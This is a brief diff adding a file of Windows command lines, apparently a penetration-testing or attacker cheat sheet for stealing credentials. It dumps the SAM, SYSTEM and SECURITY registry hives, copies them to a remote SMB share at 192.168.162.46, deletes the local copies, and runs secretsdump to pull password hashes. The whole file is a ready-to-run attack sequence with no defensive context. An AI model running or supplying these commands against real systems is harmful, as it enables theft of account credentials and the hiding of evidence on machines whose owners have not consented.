@@ -1,0 +1,14 @@
+reg save hklm\sam C:\Windows\Temp\samx
+reg save hklm\system C:\Windows\Temp\systemx
+reg save hklm\security C:\Windows\Temp\securityx
+
+cd C:\Windows\temp\
+cd C:\Users\Administrator\Downloads
+reg.exe save hklm\sam samx
+reg.exe save hklm\security securityx
+reg.exe save hklm\system systemx
+
+copy *x \\192.168.162.46\share\
+del samx systemx securityx
+
+secretsdump -sam samx -system systemx LOCAL
